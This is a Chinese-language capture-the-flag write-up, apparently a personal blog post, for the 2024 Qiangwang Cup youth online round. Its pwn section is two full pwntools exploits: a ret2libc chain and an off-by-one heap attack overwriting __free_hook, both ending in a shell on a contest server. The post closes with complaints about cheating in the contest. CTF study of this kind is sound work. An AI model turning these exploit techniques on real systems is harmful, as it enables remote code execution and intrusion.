@@ -1,0 +1,163 @@
+export const layout = "#components/Page.js";
+export const title = "2024 强网杯青少赛线上赛题解";
+export const created = "2024-11-25T16:55:35+08:00";
+
+# 2024 强网杯青少赛线上赛题解
+
+## 前言
+
+战队名：crazyNAN
+
+战队排名：6
+
+战队整体答题情况：除 web 方向 cyberboard mysqlprobe 外均解出。
+
+这辈子最后一次打强网杯青少赛了，因为我今年刚满 18 岁（（（
+
+一开始把这事情都忘了，还是 Aura 师傅拉我我才想起来，打着玩玩，话又说回来初赛和这 b Aura 有个🥚的关系啊（（
+
+全靠 👴 和 🌳 带飞（
+
+~~杂鱼 Aura~~
+
+## Wp
+
+赛时开了个飞书云文档，边打边写 wp，感觉确实不错，不用赛后专门整理 wp 了。
+
+我这里就把我做的 pwn 题发一下，剩下的可以戳这个链接看 [exp](https://bvx4hy6im9l.feishu.cn/wiki/LvdCwgCyniqVfWkRdEzc9UAvn2g?from=from_copylink)
+
+### Pwn
+
+#### clock_in
+
+板子 ret2libc，exp:
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./clock_in"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6")
+io = remote("101.200.61.16", 34841) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, "b *0x401252")
+
+io.recvuntil(": \n")
+pop_rdi_ret = 0x4011C5
+get_info_addr = 0x401202
+ret = 0x000000000040101a
+payload1 = b'a' * 64 + b'b' * 8 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(get_info_addr)
+io.sendline(payload1)
+io.recvuntil(b"\x40\n")
+puts_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
+libc_addr = puts_addr - libc.symbols['puts']
+system_addr = libc_addr + libc.symbols['system']
+binsh_addr = libc_addr + next(libc.search(b"/bin/sh"))
+log.info(f"libc_addr => {hex(libc_addr)}\nsystem_addr => {hex(system_addr)}")
+
+payload2 = flat([b'a' * (64 + 8), pop_rdi_ret, binsh_addr, ret, system_addr])
+io.recvuntil(b": \n")
+io.sendline(payload2)
+io.interactive()
+```
+
+#### journey_story
+
+off by one，libc2.31 的菜单题，赛时发现和 22 年广东省赛的题比较像，正好做过，翻了下本地 exp 拿来就打
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./journey_story"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("101.200.61.16", 20595) if argv[1] == 'r' else process(proc)
+libc = ELF("./libc-2.31.so")
+
+if args.G:
+    gdb.attach(io)
+
+
+def add_entry(size, content):
+    io.recvuntil("Choose an option: ")
+    io.sendline(b"1")
+    io.recvuntil(b": ")
+    io.sendline(hex(size).encode())
+    io.sendline(content)
+
+
+def delete_entry(index):
+    io.recvuntil("Choose an option: ")
+    io.sendline(b"2")
+    io.recvuntil(b": ")
+    io.sendline(str(index).encode())
+
+
+def update_entry(index, content):
+    io.recvuntil("Choose an option: ")
+    io.sendline(b"3")
+    io.recvuntil(b": ")
+    io.sendline(str(index).encode())
+    io.sendline(content)
+
+
+def view_entries():
+    io.recvuntil("Choose an option: ")
+    io.sendline(b"4")
+
+
+for i in range(7):
+    add_entry(0xb0, b"aaaa")
+for i in range(7):
+    delete_entry(i)
+for i in range(6):
+    add_entry(0x28, b"aaaa")
+
+update_entry(0, b'b' * 0x28 + b"\xc1")
+delete_entry(1)
+add_entry(0x28, b"eeee")
+view_entries()
+
+io.recvuntil(b"Story 2 (size 0x28): ", drop=True)
+libc_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x1ecbe0
+free_hook = libc_base + libc.sym['__free_hook']
+system_addr = libc_base + libc.sym['system']
+log.info(f"libc_base => {hex(libc_base)}\nfree_hook => {hex(free_hook)}\nsystem_addr => {hex(system_addr)}")
+
+for i in range(3):
+    add_entry(0x28, (chr(65 + i) * 4).encode())
+
+delete_entry(2)
+delete_entry(3)
+view_entries()
+io.recvuntil(b"Story 7 (size 0x28): ", drop=True)
+
+update_entry(7, p64(free_hook) + b"\n")
+add_entry(0x28, b"kkkk")
+add_entry(0x28, p64(system_addr))
+add_entry(0xb0, b"/bin/sh\x00")
+add_entry(0xb0, "test")
+delete_entry(9)
+
+io.interactive()
+```
+
+## 闲聊
+
+初赛题目不是很难，主要是想去河南逛一圈（
+
+比赛是好比赛，初心是好的，只是 py 有点严重，基本上全是代打。我真不信某个大学的三支队伍同分同排名全是自己打的，但是今年没有要求录屏，咸鱼 flag 卖烂了也是正常的吧（
+
+有点恶心哈
+
+![py直接发exp啊哥](https://pic.imgdb.cn/item/67443f4588c538a9b5bba2c3.jpg)
+
+怪不得四点多群里开始禁言了，捂大家嘴是吧。
+
+闹麻了。
